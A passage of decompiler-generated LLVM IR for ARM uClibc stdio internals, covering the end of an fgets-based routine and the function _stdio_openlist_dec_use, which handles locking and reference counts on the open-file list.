bb20:                                             ; preds = %dec_label_pc_fb30, %bb
  store i32 64316, i32* @lr, align 4
  %v1_fb38 = xor i1 %v2_fb30, true
  call void @__pseudo_cond_branch(i1 %v1_fb38, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_fb3c = load i32, i32* @r8, align 4
  %v1_fb3c = load i32, i32* @r7, align 4
  %v2_fb3c = add i32 %v1_fb3c, 64
  %v3_fb3c = inttoptr i32 %v2_fb3c to i32*
  store i32 %v0_fb3c, i32* %v3_fb3c, align 4
  br label %dec_label_pc_fb40

dec_label_pc_fb40:                                ; preds = %dec_label_pc_fae8, %bb20
  %v0_fb40 = load i32, i32* @r7, align 4
  %v1_fb40 = add i32 %v0_fb40, 60
  %v2_fb40 = inttoptr i32 %v1_fb40 to i32*
  %v3_fb40 = load i32, i32* %v2_fb40, align 4
  %v1_fb44 = add i32 %v3_fb40, 1
  store i32 %v1_fb44, i32* %r3.global-to-local, align 4
  store i32 %v1_fb44, i32* %v2_fb40, align 4
  %v0_fb4c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_fb50.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_fb54.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fb4c

dec_label_pc_fb4c:                                ; preds = %entry, %dec_label_pc_fb40
  %v0_fb54 = phi i32 [ %arg3, %entry ], [ %v0_fb54.pre, %dec_label_pc_fb40 ]
  %v0_fb50 = phi i32 [ %arg2, %entry ], [ %v0_fb50.pre, %dec_label_pc_fb40 ]
  %v0_fb4c = phi i32 [ %arg1, %entry ], [ %v0_fb4c.pre, %dec_label_pc_fb40 ]
  store i32 %v0_fb54, i32* %r2.global-to-local, align 4
  %v3_fb58 = inttoptr i32 %v0_fb4c to i8*
  %v4_fb58 = call i32 @__GI_fgets_unlocked(i8* %v3_fb58, i32 %v0_fb50, i32 %v0_fb54)
  %v0_fb5c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb5c = icmp eq i32 %v0_fb5c, 0
  store i32 %v4_fb58, i32* %r8.global-to-local, align 4
  br i1 %v2_fb5c, label %dec_label_pc_fb68, label %dec_label_pc_fbdc

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb4c
  %v0_fb68 = load i32, i32* @r7, align 4
  %v1_fb68 = add i32 %v0_fb68, 60
  %v2_fb68 = inttoptr i32 %v1_fb68 to i32*
  %v3_fb68 = load i32, i32* %v2_fb68, align 4
  %v1_fb6c = add i32 %v3_fb68, -1
  store i32 %v1_fb6c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb70 = icmp eq i32 %v1_fb6c, 0
  store i32 %v1_fb6c, i32* %v2_fb68, align 4
  br i1 %v2_fb70, label %dec_label_pc_fb7c, label %dec_label_pc_fbdc

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fb68
  %v0_fb7c = load i32, i32* %r3.global-to-local, align 4
  %v1_fb7c = load i32, i32* @r7, align 4
  %v2_fb7c = add i32 %v1_fb7c, 64
  %v3_fb7c = inttoptr i32 %v2_fb7c to i32*
  store i32 %v0_fb7c, i32* %v3_fb7c, align 4
  %v0_fb80 = load i32, i32* @r7, align 4
  %v1_fb80 = add i32 %v0_fb80, 56
  store i32 %v1_fb80, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %dec_label_pc_fbb4.dec_label_pc_fb84_crit_edge, %dec_label_pc_fb7c
  %v0_fb8c = phi i32 [ %v0_fb8c.pre, %dec_label_pc_fbb4.dec_label_pc_fb84_crit_edge ], [ %v1_fb80, %dec_label_pc_fb7c ]
  %v0_fb84 = phi i32 [ %v0_fb84.pre, %dec_label_pc_fbb4.dec_label_pc_fb84_crit_edge ], [ %v0_fb80, %dec_label_pc_fb7c ]
  %v1_fb84 = add i32 %v0_fb84, 56
  %v2_fb84 = inttoptr i32 %v1_fb84 to i32*
  %v3_fb84 = load i32, i32* %v2_fb84, align 4
  store i32 %v3_fb84, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_fb8c, i32* %r2.global-to-local, align 4
  %v1_fb9024 = inttoptr i32 %v0_fb8c to i32*
  %v2_fb9025 = load i32, i32* %v1_fb9024, align 4
  store i32 %v2_fb9025, i32* %r3.global-to-local, align 4
  %v3_fb9427 = icmp uge i32 %v2_fb9025, %v3_fb84
  store i1 %v3_fb9427, i1* %cpsr_c.global-to-local, align 1
  %v9_fb9433 = icmp eq i32 %v2_fb9025, %v3_fb84
  br i1 %v9_fb9433, label %dec_label_pc_fb9c, label %dec_label_pc_fbb4

dec_label_pc_fb9c:                                ; preds = %dec_label_pc_fb84, %dec_label_pc_fb9c.dec_label_pc_fb90_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fbac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fbac, label %dec_label_pc_fbb0, label %dec_label_pc_fb9c.dec_label_pc_fb90_crit_edge

dec_label_pc_fb9c.dec_label_pc_fb90_crit_edge:    ; preds = %dec_label_pc_fb9c
  %v0_fb90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fb94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_fb90 = inttoptr i32 %v0_fb90.pre to i32*
  %v2_fb90 = load i32, i32* %v1_fb90, align 4
  store i32 %v2_fb90, i32* %r3.global-to-local, align 4
  %v3_fb94 = icmp uge i32 %v2_fb90, %v1_fb94.pre
  store i1 %v3_fb94, i1* %cpsr_c.global-to-local, align 1
  %v9_fb94 = icmp eq i32 %v2_fb90, %v1_fb94.pre
  br i1 %v9_fb94, label %dec_label_pc_fb9c, label %dec_label_pc_fbb4

dec_label_pc_fbb0:                                ; preds = %dec_label_pc_fb9c
  %v0_fbb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fbb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fbb4

dec_label_pc_fbb4:                                ; preds = %dec_label_pc_fb84, %dec_label_pc_fb9c.dec_label_pc_fb90_crit_edge, %dec_label_pc_fbb0
  %v0_fbbc = phi i32 [ %v0_fbb0, %dec_label_pc_fbb0 ], [ %v2_fb9025, %dec_label_pc_fb84 ], [ %v2_fb90, %dec_label_pc_fb9c.dec_label_pc_fb90_crit_edge ]
  %v1_fbb4 = phi i32 [ %v0_fbb0, %dec_label_pc_fbb0 ], [ %v3_fb84, %dec_label_pc_fb84 ], [ %v1_fb94.pre, %dec_label_pc_fb9c.dec_label_pc_fb90_crit_edge ]
  %v3_fbb4 = icmp uge i32 %v0_fbbc, %v1_fbb4
  store i1 %v3_fbb4, i1* %cpsr_c.global-to-local, align 1
  %v9_fbb4 = icmp eq i32 %v0_fbbc, %v1_fbb4
  br i1 %v9_fbb4, label %dec_label_pc_fbbc, label %dec_label_pc_fbb4.dec_label_pc_fb84_crit_edge

dec_label_pc_fbb4.dec_label_pc_fb84_crit_edge:    ; preds = %dec_label_pc_fbb4
  %v0_fb84.pre = load i32, i32* @r7, align 4
  %v0_fb8c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fb84

dec_label_pc_fbbc:                                ; preds = %dec_label_pc_fbb4
  %v2_fbbc = icmp ne i32 %v1_fbb4, 0
  store i1 %v2_fbbc, i1* %cpsr_c.global-to-local, align 1
  %v7_fbc0 = icmp slt i32 %v1_fbb4, 2
  br i1 %v7_fbc0, label %dec_label_pc_fbdc, label %dec_label_pc_fbc4

dec_label_pc_fbc4:                                ; preds = %dec_label_pc_fbbc
  %v0_fbc8 = load i32, i32* @r1, align 4
  %v1_fbc8 = add i32 %v0_fbc8, 129
  store i32 %v1_fbc8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fb68, %dec_label_pc_fb4c, %dec_label_pc_fbc4, %dec_label_pc_fbbc
  %v0_fbdc = load i32, i32* %r8.global-to-local, align 4
  %v2_fbe0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fbe0, i32* @r4, align 4
  store i32 %v6_facc, i32* @r5, align 4
  store i32 %v9_facc, i32* @r6, align 4
  store i32 %v12_facc, i32* @r7, align 4
  store i32 %v15_facc, i32* @r8, align 4
  store i32 %v24_facc, i32* @lr, align 4
  ret i32 %v0_fbdc

; uselistorder directives
  uselistorder i32 %v0_fbb0, { 1, 0, 2 }
  uselistorder i32 %v1_fb94.pre, { 0, 2, 1 }
  uselistorder i32 %v0_fb54, { 1, 0 }
  uselistorder i32 %v1_fb10.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 9, 5, 6, 7, 8, 11, 10, 0, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 7, 8, 4, 5, 6, 10, 9, 0, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_fbdc, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_fbb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fb9c, { 1, 0 }
  uselistorder label %dec_label_pc_fb4c, { 1, 0 }
  uselistorder label %dec_label_pc_fb40, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_fb30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fb18, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_fbe8 = load i32, i32* @r4, align 4
  store i32 %v3_fbe8, i32* %stack_var_-20, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r5.global-to-local, align 4
  %v4_fbf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 168) to i32*), align 4
  store i32 %v4_fbf8, i32* %r7.global-to-local, align 4
  %v0_fbfc = call i32 @__aeabi_read_tp()
  store i32 %v0_fbfc, i32* %r0.global-to-local, align 4
  %v1_fc00 = add i32 %v4_fbf8, 8
  %v2_fc00 = inttoptr i32 %v1_fc00 to i32*
  %v3_fc00 = load i32, i32* %v2_fc00, align 4
  store i32 %v3_fc00, i32* %r3.global-to-local, align 4
  %v1_fc04 = add i32 %v0_fbfc, -1168
  store i32 %v1_fc04, i32* %r6.global-to-local, align 4
  %v3_fc08 = icmp uge i32 %v3_fc00, %v1_fc04
  store i1 %v3_fc08, i1* %cpsr_c.global-to-local, align 1
  %v9_fc08 = icmp eq i32 %v3_fc00, %v1_fc04
  br i1 %v9_fc08, label %dec_label_pc_fc54, label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_fbf8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_fc2093 = inttoptr i32 %v4_fbf8 to i32*
  %v2_fc2094 = load i32, i32* %v1_fc2093, align 4
  store i32 %v2_fc2094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_fc2496 = icmp eq i32 %v2_fc2094, 0
  br i1 %v9_fc2496, label %dec_label_pc_fc2c, label %dec_label_pc_fc44

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fc2c.dec_label_pc_fc20_crit_edge
  %v0_fc2c97 = phi i32 [ %v1_fc24.pre, %dec_label_pc_fc2c.dec_label_pc_fc20_crit_edge ], [ 0, %dec_label_pc_fc14 ]
  store i32 %v0_fc2c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fc3c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fc3c, label %dec_label_pc_fc40, label %dec_label_pc_fc2c.dec_label_pc_fc20_crit_edge

dec_label_pc_fc2c.dec_label_pc_fc20_crit_edge:    ; preds = %dec_label_pc_fc2c
  %v0_fc20.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fc24.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_fc20 = inttoptr i32 %v0_fc20.pre to i32*
  %v2_fc20 = load i32, i32* %v1_fc20, align 4
  store i32 %v2_fc20, i32* %r3.global-to-local, align 4
  %v3_fc24 = icmp uge i32 %v2_fc20, %v1_fc24.pre
  store i1 %v3_fc24, i1* %cpsr_c.global-to-local, align 1
  %v9_fc24 = icmp eq i32 %v2_fc20, %v1_fc24.pre
  br i1 %v9_fc24, label %dec_label_pc_fc2c, label %dec_label_pc_fc44

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fc2c
  %v0_fc40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fc40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc44

dec_label_pc_fc44:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fc2c.dec_label_pc_fc20_crit_edge, %dec_label_pc_fc40
  %v0_fc44 = phi i32 [ %v0_fc40, %dec_label_pc_fc40 ], [ %v2_fc2094, %dec_label_pc_fc14 ], [ %v2_fc20, %dec_label_pc_fc2c.dec_label_pc_fc20_crit_edge ]
  %v1_fc44 = phi i32 [ %v0_fc40, %dec_label_pc_fc40 ], [ 0, %dec_label_pc_fc14 ], [ %v1_fc24.pre, %dec_label_pc_fc2c.dec_label_pc_fc20_crit_edge ]
  %v3_fc44 = icmp uge i32 %v0_fc44, %v1_fc44
  store i1 %v3_fc44, i1* %cpsr_c.global-to-local, align 1
  %v9_fc44 = icmp eq i32 %v0_fc44, %v1_fc44
  br i1 %v9_fc44, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_fc44
  %v1_fc48 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_fc48, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_fc44, %bb
  %v1_fc4c = xor i1 %v9_fc44, true
  call void @__pseudo_cond_branch(i1 %v1_fc4c, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_fc50 = load i32, i32* %r6.global-to-local, align 4
  %v1_fc50 = load i32, i32* %r7.global-to-local, align 4
  %v2_fc50 = add i32 %v1_fc50, 8
  %v3_fc50 = inttoptr i32 %v2_fc50 to i32*
  store i32 %v0_fc50, i32* %v3_fc50, align 4
  br label %dec_label_pc_fc54

dec_label_pc_fc54:                                ; preds = %entry, %bb45
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_fc58 = load i32, i32* %r5.global-to-local, align 4
  %v2_fc58 = add i32 %v0_fc58, 168
  %v3_fc58 = inttoptr i32 %v2_fc58 to i32*
  %v4_fc58 = load i32, i32* %v3_fc58, align 4
  store i32 %v4_fc58, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_fc60 = add i32 %v0_fc58, 12
  %v3_fc60 = inttoptr i32 %v2_fc60 to i32*
  %v4_fc60 = load i32, i32* %v3_fc60, align 4
  store i32 %v4_fc60, i32* %r3.global-to-local, align 4
  %v1_fc64 = inttoptr i32 %v4_fc60 to i32*
  %v2_fc64 = load i32, i32* %v1_fc64, align 4
  store i32 %v2_fc64, i32* %r1.global-to-local, align 4
  %v1_fc68 = add i32 %v4_fc58, 4
  %v2_fc68 = inttoptr i32 %v1_fc68 to i32*
  %v3_fc68 = load i32, i32* %v2_fc68, align 4
  %v2_fc6c = icmp ne i32 %v2_fc64, 0
  store i1 %v2_fc6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc6c = icmp eq i32 %v2_fc64, 1
  %v1_fc70 = add i32 %v3_fc68, 1
  store i32 %v1_fc70, i32* %r3.global-to-local, align 4
  store i32 %v1_fc70, i32* %v2_fc68, align 4
  br i1 %v7_fc6c, label %dec_label_pc_fc7c, label %dec_label_pc_fde0

dec_label_pc_fc7c:                                ; preds = %dec_label_pc_fc54
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_fc80 = load i32, i32* %r5.global-to-local, align 4
  %v2_fc80 = add i32 %v0_fc80, 88
  %v3_fc80 = inttoptr i32 %v2_fc80 to i32*
  %v4_fc80 = load i32, i32* %v3_fc80, align 4
  store i32 %v4_fc80, i32* %r3.global-to-local, align 4
  %v1_fc84 = inttoptr i32 %v4_fc80 to i32*
  %v2_fc84 = load i32, i32* %v1_fc84, align 4
  store i32 %v2_fc84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_fc84, 1
  br i1 %tmp46, label %dec_label_pc_fde0, label %dec_label_pc_fc90

dec_label_pc_fc90:                                ; preds = %dec_label_pc_fc7c
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_fc94 = add i32 %v0_fc80, 160
  %v3_fc94 = inttoptr i32 %v2_fc94 to i32*
  %v4_fc94 = load i32, i32* %v3_fc94, align 4
  store i32 %v4_fc94, i32* %r7.global-to-local, align 4
  %v1_fc98 = add i32 %v4_fc94, 8
  %v2_fc98 = inttoptr i32 %v1_fc98 to i32*
  %v3_fc98 = load i32, i32* %v2_fc98, align 4
  store i32 %v3_fc98, i32* %r3.global-to-local, align 4
  %v1_fc9c = load i32, i32* %r6.global-to-local, align 4
  %v3_fc9c = icmp uge i32 %v3_fc98, %v1_fc9c
  store i1 %v3_fc9c, i1* %cpsr_c.global-to-local, align 1
  %v9_fc9c = icmp eq i32 %v3_fc98, %v1_fc9c
  br i1 %v9_fc9c, label %dec_label_pc_fce0, label %dec_label_pc_fca4

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc90
  store i32 %v4_fc94, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_fcac86 = inttoptr i32 %v4_fc94 to i32*
  %v2_fcac87 = load i32, i32* %v1_fcac86, align 4
  store i32 %v2_fcac87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_fcb089 = icmp eq i32 %v2_fcac87, 0
  br i1 %v9_fcb089, label %dec_label_pc_fcb8, label %dec_label_pc_fcd0

dec_label_pc_fcb8:                                ; preds = %dec_label_pc_fca4, %dec_label_pc_fcb8.dec_label_pc_fcac_crit_edge
  %v0_fcb890 = phi i32 [ %v1_fcb0.pre, %dec_label_pc_fcb8.dec_label_pc_fcac_crit_edge ], [ 0, %dec_label_pc_fca4 ]
  store i32 %v0_fcb890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fcc8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fcc8, label %dec_label_pc_fccc, label %dec_label_pc_fcb8.dec_label_pc_fcac_crit_edge

dec_label_pc_fcb8.dec_label_pc_fcac_crit_edge:    ; preds = %dec_label_pc_fcb8
  %v0_fcac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fcb0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_fcac = inttoptr i32 %v0_fcac.pre to i32*
  %v2_fcac = load i32, i32* %v1_fcac, align 4
  store i32 %v2_fcac, i32* %r3.global-to-local, align 4
  %v3_fcb0 = icmp uge i32 %v2_fcac, %v1_fcb0.pre
  store i1 %v3_fcb0, i1* %cpsr_c.global-to-local, align 1
  %v9_fcb0 = icmp eq i32 %v2_fcac, %v1_fcb0.pre
  br i1 %v9_fcb0, label %dec_label_pc_fcb8, label %dec_label_pc_fcd0

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fcb8
  %v0_fccc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fccc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fcd0

dec_label_pc_fcd0:                                ; preds = %dec_label_pc_fca4, %dec_label_pc_fcb8.dec_label_pc_fcac_crit_edge, %dec_label_pc_fccc
  %v0_fcd0 = phi i32 [ %v0_fccc, %dec_label_pc_fccc ], [ %v2_fcac87, %dec_label_pc_fca4 ], [ %v2_fcac, %dec_label_pc_fcb8.dec_label_pc_fcac_crit_edge ]
  %v1_fcd0 = phi i32 [ %v0_fccc, %dec_label_pc_fccc ], [ 0, %dec_label_pc_fca4 ], [ %v1_fcb0.pre, %dec_label_pc_fcb8.dec_label_pc_fcac_crit_edge ]
  %v3_fcd0 = icmp uge i32 %v0_fcd0, %v1_fcd0
  store i1 %v3_fcd0, i1* %cpsr_c.global-to-local, align 1
  %v9_fcd0 = icmp eq i32 %v0_fcd0, %v1_fcd0
  br i1 %v9_fcd0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_fcd0
  %v1_fcd4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_fcd4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_fcd0, %bb47
  %v1_fcd8 = xor i1 %v9_fcd0, true
  call void @__pseudo_cond_branch(i1 %v1_fcd8, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_fcdc = load i32, i32* %r6.global-to-local, align 4
  %v1_fcdc = load i32, i32* %r7.global-to-local, align 4
  %v2_fcdc = add i32 %v1_fcdc, 8
  %v3_fcdc = inttoptr i32 %v2_fcdc to i32*
  store i32 %v0_fcdc, i32* %v3_fcdc, align 4
  %v0_fce8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fce0

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fc90, %bb48
  %v0_fce8 = phi i32 [ %v0_fc80, %dec_label_pc_fc90 ], [ %v0_fce8.pre, %bb48 ]
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 84, i32* %r1.global-to-local, align 4
  %v2_fce8 = add i32 %v0_fce8, 160
  %v3_fce8 = inttoptr i32 %v2_fce8 to i32*
  %v4_fce8 = load i32, i32* %v3_fce8, align 4
  store i32 %v4_fce8, i32* %r0.global-to-local, align 4
  %v2_fcec = add i32 %v0_fce8, 84
  %v3_fcec = inttoptr i32 %v2_fcec to i32*
  %v4_fcec = load i32, i32* %v3_fcec, align 4
  store i32 %v4_fcec, i32* %r2.global-to-local, align 4
  %v1_fcf0 = add i32 %v4_fce8, 4
  %v2_fcf0 = inttoptr i32 %v1_fcf0 to i32*
  %v3_fcf0 = load i32, i32* %v2_fcf0, align 4
  store i32 %v3_fcf0, i32* %r3.global-to-local, align 4
  %v1_fcf4 = inttoptr i32 %v4_fcec to i32*
  %v2_fcf4 = load i32, i32* %v1_fcf4, align 4
  store i32 %v2_fcf4, i32* %r2.global-to-local, align 4
  %v1_fcf8 = add i32 %v3_fcf0, 1
  store i32 %v1_fcf8, i32* %r3.global-to-local, align 4
  store i32 84, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_fcf8, i32* %v2_fcf0, align 4
  %v0_fd48.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd4811 = icmp eq i32 %v0_fd48.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_fd4811, label %dec_label_pc_fd54, label %dec_label_pc_fd0c

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fce0, %dec_label_pc_fd44
  %v0_fd302 = phi i32 [ %v0_fd44, %dec_label_pc_fd44 ], [ %v0_fd48.pr, %dec_label_pc_fce0 ]
  %v1_fd0c = inttoptr i32 %v0_fd302 to i16*
  %v2_fd0c = load i16, i16* %v1_fd0c, align 2
  %v3_fd0c = zext i16 %v2_fd0c to i32
  store i32 %v3_fd0c, i32* %r3.global-to-local, align 4
  %v2_fd10 = and i32 %v3_fd0c, 32816
  store i32 %v2_fd10, i32* %r1.global-to-local, align 4
  %v2_fd14 = icmp ugt i32 %v2_fd10, 47
  store i1 %v2_fd14, i1* %cpsr_c.global-to-local, align 1
  %v7_fd14 = icmp eq i32 %v2_fd10, 48
  %v1_fd18 = add i32 %v0_fd302, 32
  %v2_fd18 = inttoptr i32 %v1_fd18 to i32*
  %v3_fd18 = load i32, i32* %v2_fd18, align 4
  store i32 %v3_fd18, i32* %r4.global-to-local, align 4
  br i1 %v7_fd14, label %dec_label_pc_fd24, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_fd0c
  store i32 %v0_fd302, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fd44

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd0c
  %v0_fd24 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd24 = icmp eq i32 %v0_fd24, 0
  br i1 %v2_fd24, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_fd24
  %v1_fd28 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd28 = load i32, i32* %r7.global-to-local, align 4
  %v3_fd28 = add i32 %v2_fd28, %v1_fd28
  %v4_fd28 = inttoptr i32 %v3_fd28 to i32*
  %v5_fd28 = load i32, i32* %v4_fd28, align 4
  store i32 %v5_fd28, i32* %r3.global-to-local, align 4
  %v3_fd2c = inttoptr i32 %v5_fd28 to i32*
  store i32 %v3_fd18, i32* %v3_fd2c, align 4
  %v0_fd30 = load i32, i32* %r2.global-to-local, align 4
  %v1_fd30 = inttoptr i32 %v0_fd30 to i16*
  %v2_fd30 = load i16, i16* %v1_fd30, align 2
  %v3_fd30 = zext i16 %v2_fd30 to i32
  store i32 %v3_fd30, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_fd24
  %v2_fd308 = load i16, i16* %v1_fd0c, align 2
  %v3_fd309 = zext i16 %v2_fd308 to i32
  store i32 %v3_fd309, i32* %r3.global-to-local, align 4
  %v3_fd34 = add i32 %v0_fd24, 32
  %v4_fd34 = inttoptr i32 %v3_fd34 to i32*
  store i32 %v3_fd18, i32* %v4_fd34, align 4
  %v0_fd38.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_fd38 = phi i32 [ %v3_fd30, %.thread ], [ %v0_fd38.pre, %bb49 ]
  %v1_fd38 = and i32 %v0_fd38, 8192
  %v2_fd38 = icmp eq i32 %v1_fd38, 0
  br i1 %v2_fd38, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_fd3c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_fd3c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_fd40 = xor i1 %v2_fd38, true
  call void @__pseudo_cond_branch(i1 %v1_fd40, i32 ptrtoint (i32* @global_var_c038.332 to i32))
  %v0_fd44.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %.thread38, %bb52
  %v0_fd44 = phi i32 [ %v0_fd44.pre, %bb52 ], [ %v3_fd18, %.thread38 ]
  store i32 %v0_fd44, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd48 = icmp eq i32 %v0_fd44, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_fd48, label %dec_label_pc_fd54, label %dec_label_pc_fd0c

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd44, %dec_label_pc_fce0
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_fd58 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd58 = add i32 %v0_fd58, 160
  %v3_fd58 = inttoptr i32 %v2_fd58 to i32*
  %v4_fd58 = load i32, i32* %v3_fd58, align 4
  store i32 %v4_fd58, i32* %r0.global-to-local, align 4
  %v1_fd5c = add i32 %v4_fd58, 4
  %v2_fd5c = inttoptr i32 %v1_fd5c to i32*
  %v3_fd5c = load i32, i32* %v2_fd5c, align 4
  %v1_fd60 = add i32 %v3_fd5c, -1
  store i32 %v1_fd60, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd64 = icmp eq i32 %v1_fd60, 0
  store i32 %v1_fd60, i32* %v2_fd5c, align 4
  br i1 %v2_fd64, label %dec_label_pc_fd70, label %dec_label_pc_fdd0

dec_label_pc_fd70:                                ; preds = %dec_label_pc_fd54
  %v0_fd70 = load i32, i32* %r3.global-to-local, align 4
  %v1_fd70 = load i32, i32* %r0.global-to-local, align 4
  %v2_fd70 = add i32 %v1_fd70, 8
  %v3_fd70 = inttoptr i32 %v2_fd70 to i32*
  store i32 %v0_fd70, i32* %v3_fd70, align 4
  %v0_fd74 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fd74, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fd78

dec_label_pc_fd78:                                ; preds = %dec_label_pc_fda8.dec_label_pc_fd78_crit_edge, %dec_label_pc_fd70
  %v0_fd78 = phi i32 [ %v0_fd78.pre, %dec_label_pc_fda8.dec_label_pc_fd78_crit_edge ], [ %v0_fd74, %dec_label_pc_fd70 ]
  %v1_fd78 = inttoptr i32 %v0_fd78 to i32*
